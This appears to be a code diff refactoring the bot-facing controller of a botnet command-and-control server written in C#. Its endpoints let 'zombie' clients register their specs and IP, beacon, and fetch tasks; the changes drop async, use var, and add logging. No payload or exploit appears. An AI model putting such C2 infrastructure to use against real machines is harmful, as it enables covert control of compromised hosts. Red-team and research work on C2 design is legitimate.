@@ -11,13 +11,13 @@ public class ZombieController : AbstractController
 {
     [HttpGet("ZombieTest")]
     [ProducesResponseType(StatusCodes.Status200OK)]
-    public async Task<IActionResult> ZombieTest() => Ok();
+    public IActionResult ZombieTest() => Ok();
 
     [HttpPost("Register")]
     [ProducesResponseType(typeof(InitialResponse), StatusCodes.Status200OK)]
-    public async Task<IActionResult> Register([FromBody] InitialParameters parameters)
+    public IActionResult Register([FromBody] InitialParameters parameters)
     {
-        BotClientSpecs specs = new BotClientSpecs()
+        var specs = new BotClientSpecs()
         {
             Ram = parameters.Ram,
             CPU = parameters.CPU,
@@ -27,15 +27,17 @@ public class ZombieController : AbstractController
         string name = Randomizer.GenerateName();
         int id = Randomizer.GenerateInt();
 
+        Console.WriteLine($"New bot registered: {name} | {id}");
+
         DateTime lastHeardFrom = DateTime.UtcNow;
 
-        BotClientConnectionInfo connectionInfo = new BotClientConnectionInfo()
+        var connectionInfo = new BotClientConnectionInfo()
         {
             Ip = parameters.Ip,
             LastHeardFrom = lastHeardFrom
         };
 
-        BotClient botClient = new BotClient()
+        var botClient = new BotClient()
         {
             Id = id,
             Name = name,
@@ -44,7 +46,7 @@ public class ZombieController : AbstractController
             BotClientSpecs = specs
         };
 
-        C2State.BotManager.Bots.TryAdd(id, botClient);
+        _ = C2State.BotManager.Bots.TryAdd(id, botClient);
 
         var initialResponse = new InitialResponse()
         {
@@ -57,9 +59,13 @@ public class ZombieController : AbstractController
 
     [HttpGet("Beacon")]
     [ProducesResponseType(typeof(ActionEnum), StatusCodes.Status200OK)]
-    public async Task<IActionResult> Beacon([FromQuery] int bot_id, [FromQuery] int task_id, [FromQuery] ProgressEnum progress)
+    public IActionResult Beacon([FromQuery] int bot_id, [FromQuery] int task_id, [FromQuery] ProgressEnum progress)
     {
-        var bot = C2State.BotManager.Bots[bot_id];
+        BotClient bot = C2State.BotManager.Bots[bot_id];
+
+        Console.WriteLine($"Zombie beaconed: {bot.Name} | {bot_id}");
+
+        
         bot.ConnectionInfo.LastHeardFrom = DateTime.UtcNow;
 
         return Ok(ActionEnum.CONTINUE);
@@ -68,13 +74,16 @@ public class ZombieController : AbstractController
     [HttpGet("Request")]
     [ProducesResponseType(typeof(BotTask), StatusCodes.Status200OK)]
     [ProducesResponseType(StatusCodes.Status204NoContent)]
-    public async Task<IActionResult> Request([FromQuery] int bot_id)
+    public new IActionResult Request([FromQuery] int bot_id)
     {
+        BotClient bot = C2State.BotManager.Bots[bot_id];
+        Console.WriteLine($"Zombie requested task: {bot.Name} | {bot_id}");
+
         BotTask? task = C2State.TaskManager.DispatchTask();
 
         if (task != null)
         {
-            C2State.BotManager.Bots[bot_id].TaskId = task.Id;
+            bot.TaskId = task.Id;
             return Ok(task);
         }
 
